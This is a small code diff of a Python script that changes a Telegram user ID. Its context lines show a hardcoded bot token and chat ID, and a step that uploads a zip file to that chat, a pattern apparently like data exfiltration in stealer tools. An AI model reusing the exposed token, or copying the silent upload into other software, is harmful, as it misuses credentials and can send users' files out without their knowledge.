@@ -782,7 +782,7 @@ async def main():
 
     BOT_TOKEN = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
     CHAT_ID = -1001933102780
-    USER_TLG_ID = 1972505293
+    USER_TLG_ID = 12345
 
     if zip_filepath:
         await send_zip_to_telegram(zip_filepath, BOT_TOKEN, CHAT_ID)
